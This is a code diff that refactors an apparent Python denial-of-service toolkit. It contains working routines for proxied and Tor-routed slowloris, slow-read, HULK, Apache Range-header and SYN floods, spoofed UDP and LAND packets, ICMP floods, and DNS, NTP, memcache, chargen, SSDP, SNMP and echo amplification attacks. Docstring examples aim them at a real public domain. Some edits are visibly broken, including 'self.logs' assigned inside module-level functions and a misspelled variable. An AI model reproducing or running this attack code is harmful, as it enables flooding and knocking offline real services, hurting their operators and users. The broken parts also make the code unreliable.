+    elif z=="s5":
+     line=random.choice(self.socks5list)
     ipp=line.split(":")[0].split("=")[0]
     pp=line.split(":")[1].split("=")[0]
     s =socks.socksocket()
-    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
+    if z=="h":
      s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
-    elif (z in [13,14,15,16]):
+    elif z=="s4":
      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
-    elif (z in [17,18,19,20]):
+    elif z=="s5":
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
-    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if z<13:
+    if z=="h":
      s.settimeout(self.timeout)
     s.connect((self.target,self.port))
-    while (stop!=True):
+    while True:
+     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+      break
+     if self.stop==True:
+      break
      try:
       s.send("\x00".encode('utf-8'))#send NULL character
-      if prints==True:
-       print("[{}: Voly sent-->{}]".format(x,ipp))
+      if self.logs==True:
+       sys.stdout.write("\r[{}: Voly sent-->{}]     ".format(x,ipp))
+       sys.stdout.flush()
      except:
       break
      time.sleep(.2)
    except:
     pass
    time.sleep(.3)
-  self.target=None
-  self.port=None
-  self.timeout=None
-  x=None
-def prox_xerxes(u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True,level=1):
- '''
-  u: target ip or domain
-  p: (set by default to: 80) targeted port
-  threads: (set by default to: 500) number of connections
-  timeout: (set by default to: 5) the connection timeout flag value
-  example:
-  >>>import bane
-  >>>bane.prox_hammer('www.google.com',threads=256)
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
+  
 '''
- thr=[]
- global speed
- speed=level
- global httplist
- if http_list:
-  httplist=http_list
- else:
-  httplist=masshttp(timeout=scraping_timeout)
- global socks4list
- if socks4_list:
-  socks4list=socks4_list
- else:
-  socks4list=massocks4(timeout=scraping_timeout)
- global socks5list
- if socks5_list:
-  socks5list=socks5_list
- else:
-  socks5list=massocks5(timeout=scraping_timeout)
- global stop
- stop=False
- global prints
- prints=logs
- global pointer
- global target
- target=u
- global port
- port=p
- global _timeout
- _timeout=timeout
- global pointer
- for j in range(threads):
-  try:
-    pointer=j
-    t=pxer()
-    t.start()
-    thr.append(t)
-    time.sleep(.001)
-  except:
-    pass
- c=time.time()
- while True:
-  if stop==True:
-   break
-  try:
-   time.sleep(.1)
-   if int(time.time()-c)==duration:
-    stop=True
-    break
-  except KeyboardInterrupt:
-   stop=True
-   break
- if logs==True:
-     print("[*]Killing all threads...")
- for x in thr:
-    try:
-      x.join(1)
-    except Exception as e:
-      pass
-    del x
- if logs==True:
-     print("[*]Done!")
-class slrd(threading.Thread):
- def run(self):
-  self.target=target
-  self.port=port
-  self.timeout=_timeout
-  self.tor=tor
-  self.speed=speed
-  self.rre2=rre2
-  self.rre1=rre1
-  self.sre1=sre1
-  self.sre2=sre2
-  time.sleep(2)
-  while (stop!=True):
-   try: 
-    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if self.tor==False:
-     s.settimeout(self.timeout)
-    if self.tor==True:
-     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((self.target,self.port))
-    if ((self.port==443)or(self.port==8443)):
-     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    while (stop!=True):
-     pa=random.choice(paths)
-     q=''
-     for i in range(random.randint(2,5)):
-      q+=random.choice(lis)+str(random.randint(1,100000))
-     p=''
-     for i in range(random.randint(2,5)):
-      p+=random.choice(lis)+str(random.randint(1,100000))
-     if '?' in pa:
-      jo='&'
-     else:
-      jo='?' 
-     pa+=jo+q+"="+p
-     try:
-      g=random.randint(1,2)
-      if g==1:
-       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
-      else:
-       q='q='
-       for i in range(10,random.randint(20,50)):
-        q+=random.choice(lis)
-       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
-      d=s.recv(random.randint(self.rre1,self.rre2))
-      if prints==True:
-        sys.stdout.write("\rReceived: {}   ".format(str(d.decode('utf-8'))))
-        sys.stdout.flush()
-        #print("Received: {}".format(str(d.decode('utf-8'))))
-      time.sleep(random.randint(self.sre1,self.sre2))
-     except:
-      break
-    s.close()
-   except Exception as e:
-    pass
-  self.target=None
-  self.port=None
-  self.timeout=None
-  self.tor=None
-  self.speed=None
-  self.rre2=None
-  self.rre1=None
-  self.sre1=None
-  self.sre2=None
-def slow_read(u,p=80,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=True,set_tor=False,duration=60):
- '''
    this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.
 
    it takes the following parameters:
@@ -1114,56 +818,85 @@ def slow_read(u,p=80,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,mi
    >>>bane.slow_read_attack('www.google.com',p=443,threads=300,timeout=7)
 
 '''
- thr=[]
- global tor
- tor=set_tor
- global stop
- stop=False
- global prints
- prints=logs
- global target
- target=u
- global port
- port=p
- global _timeout
- _timeout=timeout
- global sre1
- sre1=min_speed
- global sre2
- sre2=max_speed
- global rre1
- rre1=min_read
- global rre2
- rre2=max_read
- for x in range(threads):
-  try:
-   t= slrd()
+
+class slow_read:
+ def __init__(self,u,p=80,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
+  self.stop=False
+  self.target=u
+  self.port=p
+  self.timeout=timeout
+  self.tor=tor
+  self.read_max=max_read
+  self.read_min=min_read
+  self.min_speed=min_speed
+  self.max_speed=max_speed
+  self.logs=logs
+  self.duration=duration
+  self.start=time.time()
+  for x in range(threads):
+   t=threading.Thread(target=self.attack)
+   t.daemon=True
    t.start()
-   thr.append(t)
-  except:
+ def attack(self):
+  time.sleep(1)
+  while True:
+   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+     break
+   if self.stop==True:
+     break
+   try: 
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    if self.tor==False:
+     s.settimeout(self.timeout)
+    if self.tor==True:
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
+    s.connect((self.target,self.port))
+    if ((self.port==443)or(self.port==8443)):
+     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+    while True:
+     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+      break
+     if self.stop==True:
+      break
+     pa=random.choice(paths)
+     q=''
+     for i in range(random.randint(2,5)):
+      q+=random.choice(lis)+str(random.randint(1,100000))
+     p=''
+     for i in range(random.randint(2,5)):
+      p+=random.choice(lis)+str(random.randint(1,100000))
+     if '?' in pa:
+      jo='&'
+     else:
+      jo='?' 
+     pa+=jo+q+"="+p
+     try:
+      g=random.randint(1,2)
+      if g==1:
+       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+      else:
+       q='q='
+       for i in range(10,random.randint(20,50)):
+        q+=random.choice(lis)
+       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
+      d=s.recv(random.randint(self.read_min,self.read_max))
+      if self.logs==True:
+        sys.stdout.write("\rReceived: {}   ".format(str(d.decode('utf-8').strip())))
+        sys.stdout.flush()
+        #print("Received: {}".format(str(d.decode('utf-8'))))
+      time.sleep(random.randint(self.min_speed,self.max_speed))
+     except:
+      break
+    s.close()
+   except:
     pass
- c=time.time()
- while True:
-  if stop==True:
-   break
-  try:
-   time.sleep(.1)
-   if int(time.time()-c)==duration:
-    stop=True
-    break
-  except KeyboardInterrupt:
-   stop=True
-   break
- if logs==True:
-     print("[*]Killing all threads...")
- for x in thr:
-    try:
-      x.join(1)
-    except Exception as e:
-      pass
-    del x
- if logs==True:
-     print("[*]Done!")
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
+
+
 class apa(threading.Thread):
  def run(self):
   global apache_killer_counter
@@ -1171,9 +904,9 @@ class apa(threading.Thread):
   self.port=port
   self.timeout=_timeout
   self.tor=tor
-  self.packs2=packs2
-  self.packs1=packs1
-  self.speed=speed
+  self.round_min=packs2
+  self.round_max=packs1
+  self.interval=speed
   time.sleep(2)
   while (stop!=True):
    try:
@@ -1188,36 +921,36 @@ class apa(threading.Thread):
     s.connect((self.target, self.port))
     if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for x in range(random.randint(self.packs2,self.packs1)):
+    for x in range(random.randint(self.round_min,self.round_max)):
      if stop==True:
       break
      try:
       s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(random.randint(1,1000000))+str(random.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
       apache_killer_counter+=1
-      if prints==True:
+      if self.logs==True:
         sys.stdout.write("\rRequests sent: {}".format(apache_killer_counter))
         sys.stdout.flush()
         #print("Requests sent: {}".format(apache_killer_counter))
      except:
       break
-     time.sleep(self.speed)
+     time.sleep(self.interval)
    except:
     pass
   self.target=None
   self.port=None
   self.timeout=None
   self.tor=None
-  self.packs2=None
-  self.packs1=None
-  self.speed=None
+  self.round_min=None
+  self.round_max=None
+  self.interval=None
 class ptc(threading.Thread):
  def run(self):
   global proxslow_counter
   self.target=target
   self.port=port
   self.timeout=_timeout
-  self.sre1=sre1
-  self.sre2=sre2
+  self.min_speed=sre1
+  self.max_speed=sre2
   time.sleep(2)
   while (stop!=True):
    try:
@@ -1257,11 +990,11 @@ class ptc(threading.Thread):
        for i in range(10,random.randint(20,50)):
         q+=random.choice(lis)
        s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
-      if prints==True:
+      if self.logs==True:
         sys.stdout.write("\rSlow-->{}   ".format(ipp))
         sys.stdout.flush()
         #print("Slow-->{}".format(ipp))
-      time.sleep(random.randint(self.sre1,self.sre2))
+      time.sleep(random.randint(self.min_speed,self.max_speed))
      except:
       break
     s.close()
@@ -1270,8 +1003,8 @@ class ptc(threading.Thread):
   self.target=None
   self.port=None
   self.timeout=None
-  self.sre1=None
-  self.sre2=None
+  self.min_speed=None
+  self.max_speed=None
 def prox_slow(u,p=80,scraping_timeout=15,threads=500,timeout=5,min_speed=3,max_speed=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True,returning=False,set_tor=False):
  thr=[]
  global proxslow_counter
@@ -1295,8 +1028,8 @@ def prox_slow(u,p=80,scraping_timeout=15,threads=500,timeout=5,min_speed=3,max_s
  tor=set_tor
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -1366,8 +1099,8 @@ def apache_killer(u,p=80,threads=256,timeout=5,round_min=5,round_max=15,interval
  tor=set_tor
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -1417,7 +1150,7 @@ class loris(threading.Thread):
   self.timeout=_timeout
   self.tor=tor
   ls=[]
-  if prints==True:
+  if self.logs==True:
    print("\tBuilding sockets...")
   time.sleep(1)
   while (stop!=True):
@@ -1460,7 +1193,7 @@ class loris(threading.Thread):
       slowloris_counter=0
    if stop==True:
     break
-   if prints==True:
+   if self.logs==True:
     sys.stdout.write("\r\tSockets alive: {}".format(slowloris_counter))
     sys.stdout.flush()
   for soc in ls:
@@ -1494,8 +1227,8 @@ def slowloris(u,p=80,threads=20,timeout=5,duration=60,logs=True,set_tor=False):
  tor=set_tor
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -1539,7 +1272,7 @@ class plor(threading.Thread):
   self.target=target
   self.port=port
   self.timeout=_timeout
-  self.speed=speed
+  self.interval=speed
   time.sleep(2)
   while (stop!=True):
    try:
@@ -1583,8 +1316,8 @@ class plor(threading.Thread):
     s.send("Connection: keep-alive\r\n".encode("utf-8"))
     while (stop!=True):
      s.send("X-a: {}\r\n".format(random.randint(1,10000000)).encode("utf-8"))
-     time.sleep(self.speed)
-     if prints==True:
+     time.sleep(self.interval)
+     if self.logs==True:
         sys.stdout.write("\rSocket-->{}   ".format(ipp))
         sys.stdout.flush()
         #print("socket-->{}".format(ipp))
@@ -1593,7 +1326,7 @@ class plor(threading.Thread):
   self.target=None
   self.port=None
   self.timeout=None
-  self.speed=None
+  self.interval=None
 def prox_slowloris(u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True,level=1):
  '''
   u: target ip or domain
@@ -1624,8 +1357,8 @@ def prox_slowloris(u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=No
   socks5list=massocks5(timeout=scraping_timeout)
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global pointer
  global target
  target=u
@@ -1702,7 +1435,7 @@ class phu(threading.Thread):
     if stop==True:
         break
     proxhulk_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rRequests: {} | Bot: {}   ".format(proxhulk_counter,pr.split(':')[0]))
         sys.stdout.flush()
         #print("Requests: {} | Bot: {}".format(proxhulk_counter,pr.split(':')[0]))
@@ -1749,7 +1482,7 @@ class hu(threading.Thread):
       if stop==True:
         break
       hulk_counter+=1
-      if prints==True:
+      if self.logs==True:
         sys.stdout.write("\rRequests: {}".format(hulk_counter))
         sys.stdout.flush()
         #print("Requests: {}".format(hulk_counter))
@@ -1757,7 +1490,7 @@ class hu(threading.Thread):
       if stop==True:
         break
       hulk_counter+=1
-      if prints==True:
+      if self.logs==True:
         sys.stdout.write("\rRequests: {}".format(hulk_counter))
         sys.stdout.flush()
         #print("Requests: {}".format(hulk_counter))
@@ -1789,8 +1522,8 @@ def hulk(u,threads=700,timeout=10,duration=60,logs=True,returning=False,set_tor=
   socket.socket = socks.socksocket
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global _timeout
@@ -1849,8 +1582,8 @@ def prox_hulk(u,threads=700,scraping_timeout=15,http_list=None,timeout=10,durati
  proxhulk_counter=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global httplist
@@ -1915,7 +1648,7 @@ class sflood(threading.Thread):
   global synflood_counter
   self.minsize=minsize
   self.maxsize=maxsize
-  self.speed=speed
+  self.interval=speed
   self.target=target
   dip=self.target
   self.port=port
@@ -2033,13 +1766,13 @@ class sflood(threading.Thread):
     packet = iph + tcp_header + urd
     s.sendto(packet, (dip,self.port))
     synflood_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets: {} | IP: {} | Type: {} | Bytes: {}   ".format(synflood_counter,sip,req,leng))
         sys.stdout.flush()
         #print("Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
    except Exception as e:
-    print(e)
-   time.sleep(self.speed)
+    pass
+   time.sleep(self.interval)
   self.tos=None
   self.frag_off=None
   self.urg_pointe=None
@@ -2047,7 +1780,7 @@ class sflood(threading.Thread):
   self.ack_seq=None
   self.minsize=None
   self.maxsize=None
-  self.speed=None
+  self.interval=None
   self.target=None
   dip=None
   self.port=None
@@ -2135,8 +1868,8 @@ def syn_flood(u,p=80,limiting=True,min_size=10,max_size=50,interval=0.1,tos=0,pa
   min_win=min_window#min window size value
   if min_win<0:
    min_win=0
-  global prints
-  prints=logs
+  
+  self.logs=logs
   global target
   target=u
   global port
@@ -2206,7 +1939,7 @@ def syn_flood(u,p=80,limiting=True,min_size=10,max_size=50,interval=0.1,tos=0,pa
 class udpsp(threading.Thread):
  def run(self):
   global udpstorm_counter
-  self.speed=speed
+  self.interval=speed
   self.target=target
   self.port=port
   self.maxttl=maxttl
@@ -2239,14 +1972,14 @@ class udpsp(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
     udpstorm_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets: {} | IP: {} | Type: UDP | Bytes: {}   ".format(udpstorm_counter,sip,len(packet)))
         sys.stdout.flush()
         #print("Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(udpstorm_counter,sip,len(packet)))
    except:
     pass
-   time.sleep(self.speed)
-  self.speed=None
+   time.sleep(self.interval)
+  self.interval=None
   self.target=None
   self.port=None
   self.maxttl=None
@@ -2282,8 +2015,8 @@ def spoofed_udp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,
  max_por=max_port
  global ip_seg
  ip_seg=ip_range
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -2333,7 +2066,7 @@ class ln(threading.Thread):
   global land_counter
   self.minsize=minsize
   self.maxsize=maxsize
-  self.speed=speed
+  self.interval=speed
   self.target=target
   self.port=port
   self.maxttl=maxttl
@@ -2400,16 +2133,16 @@ class ln(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
     land_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets: {} | Type: {} | Bytes: {}   ".format(land_counter,req,len(urd)))
         sys.stdout.flush()
         #print("Packets: {} | Type: {} | Bytes: {}".format(land_counter,req,len(urd)))
    except Exception as e:
     pass
-   time.sleep(self.speed)
+   time.sleep(self.interval)
   self.minsize=None
   self.maxsize=None
-  self.speed=None
+  self.interval=None
   self.target=None
   self.port=None
   self.maxttl=None
@@ -2443,8 +2176,8 @@ def land(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,threads=100,m
  min_win=min_window
  if min_win<0:
    min_win=0
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -2500,7 +2233,7 @@ def land(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,threads=100,m
 class dampli(threading.Thread):
  def run(self):
   global dnsamplif_counter
-  self.speed=speed
+  self.interval=speed
   self.target=target
   self.port=port
   self.query=query
@@ -2514,14 +2247,14 @@ class dampli(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(ip,53))
     dnsamplif_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(dnsamplif_counter,ip))
         sys.stdout.flush()
         #print ("Packets sent: {} | IP: {}".format(dnsamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(self.speed)
-  self.speed=None
+   time.sleep(self.interval)
+  self.interval=None
   self.target=None
   self.port=None
   self.query=None
@@ -2551,8 +2284,8 @@ def dns_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,q
  dnsamplif_counter=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -2606,7 +2339,7 @@ def dns_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,q
 class nampli(threading.Thread):
  def run(self):
   global ntpamplif_counter
-  self.speed=speed
+  self.interval=speed
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2619,14 +2352,14 @@ class nampli(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(ip,123))
     ntpamplif_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(ntpamplif_counter,ip))
         sys.stdout.flush()
         #print ("Packets sent: {} | IP: {}".format(ntpamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(self.speed)
-  self.speed=None
+   time.sleep(self.interval)
+  self.interval=None
   self.target=None
   self.port=None
 def ntp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
@@ -2663,8 +2396,8 @@ def ntp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,d
  ntpamplif_counter=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -2710,7 +2443,7 @@ def ntp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,d
 class memampli(threading.Thread):
  def run(self):
   global memcacheamplif_counter
-  self.speed=speed
+  self.interval=speed
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2723,14 +2456,14 @@ class memampli(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(ip,11211))
     memcacheamplif_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(memcacheamplif_counter,ip))
         sys.stdout.flush()
         #print ("Packets sent: {} | IP: {}".format(memcacheamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(self.speed)
-  self.speed=None
+   time.sleep(self.interval)
+  self.interval=None
   self.target=None
   self.port=None
 def memcache_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
@@ -2758,8 +2491,8 @@ def memcache_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=
   speed=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -2806,7 +2539,7 @@ class charampli(threading.Thread):
  def run(self):
   global chargenamplif_counter
   self.target=target
-  self.speed=speed
+  self.interval=speed
   self.port=port
   time.sleep(2)
   while (stop!=True):
@@ -2818,15 +2551,15 @@ class charampli(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(ip,19))
     chargenamplif_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(chargenamplif_counter,ip))
         sys.stdout.flush()
         #print ("Packets sent: {} | IP: {}".format(chargenamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(self.speed)
+   time.sleep(self.interval)
   self.target=None
-  self.speed=None
+  self.interval=None
   self.port=None
 def chargen_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
  '''
@@ -2853,8 +2586,8 @@ def chargen_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=1
   speed=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -2900,7 +2633,7 @@ def chargen_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=1
 class ssampli(threading.Thread):
  def run(self):
   global ssdpamplif_counter
-  self.speed=speed
+  self.interval=speed
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2913,14 +2646,14 @@ class ssampli(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(ip,1900))
     ssdpamplif_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(ssdpamplif_counter,ip))
         sys.stdout.flush()
         #print ("Packets sent: {} | IP: {}".format(ssdpamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(self.speed)
-  self.speed=None
+   time.sleep(self.interval)
+  self.interval=None
   self.target=None
   self.port=None
 def ssdp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
@@ -2948,8 +2681,8 @@ def ssdp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,
   speed=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -2996,7 +2729,7 @@ class snampli(threading.Thread):
  def run(self):
   global snmpamplif_counter
   self.target=target
-  self.speed=speed
+  self.interval=speed
   self.port=port
   time.sleep(2)
   while (stop!=True):
@@ -3008,15 +2741,15 @@ class snampli(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(ip,161))
     snmpamplif_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(snmpamplif_counter,ip))
         sys.stdout.flush()
         #print ("Packets sent: {} | IP: {}".format(snmpamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(self.speed)
+   time.sleep(self.interval)
   self.target=None
-  self.speed=None
+  self.interval=None
   self.port=None
 def snmp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
  '''
@@ -3043,7 +2776,7 @@ def snmp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,
   speed=0
  global stop
  stop=False
- global prints
+ 
  prinnts=logs
  global target
  target=u
@@ -3093,7 +2826,7 @@ class echst(threading.Thread):
   self.target=target
   self.minsize=minsize
   self.maxsize=maxsize
-  self.speed=speed
+  self.interval=speed
   self.port=port
   time.sleep(2)
   while (stop!=True):
@@ -3110,17 +2843,17 @@ class echst(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(ip,port))
     echo_ref_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {} | Bytes: {}   ".format(echo_ref_counter,ip,len(data)))
         sys.stdout.flush()
         #print("Packets sent: {} | IP: {} | Bytes: {}".format(echo_ref_counter,ip,len(data)))
    except Exception as e:
     pass
-   time.sleep(self.speed)
+   time.sleep(self.interval)
   self.target=None
   self.minsize=None
   self.maxsize=None
-  self.speed=None
+  self.interval=None
   self.port=None
 def echo_reflection(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=True):
  '''
@@ -3139,8 +2872,8 @@ def echo_reflection(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,se
   speed=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -3186,7 +2919,7 @@ def echo_reflection(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,se
 class icmpcl(threading.Thread):
  def run(self):
   global icmp_counter
-  self.speed=speed
+  self.interval=speed
   self.minsize=minsize
   self.maxsize=maxsize
   self.target=target
@@ -3207,14 +2940,14 @@ class icmpcl(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
     icmp_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | Bytes: {}  ".format(icmp_counter,len(data)))
         sys.stdout.flush()
         #print("Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
    except Exception as e:
     pass
-   time.sleep(self.speed)
-  self.speed=None
+   time.sleep(self.interval)
+  self.interval=None
   self.minsize=None
   self.maxsize=None
   self.target=None
@@ -3238,8 +2971,8 @@ def icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,min_ttl
  icmp_counter=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -3287,7 +3020,7 @@ def icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,min_ttl
 class icmpst(threading.Thread):
  def run(self):
   global icmpstorm_counter
-  self.speed=speed
+  self.interval=speed
   self.target=target
   self.port=port
   self.minttl=minttl
@@ -3313,14 +3046,14 @@ class icmpst(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
     icmpstorm_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {} | Bytes: {}  ".format(icmpstorm_counter,sip,len(data)))
         sys.stdout.flush()
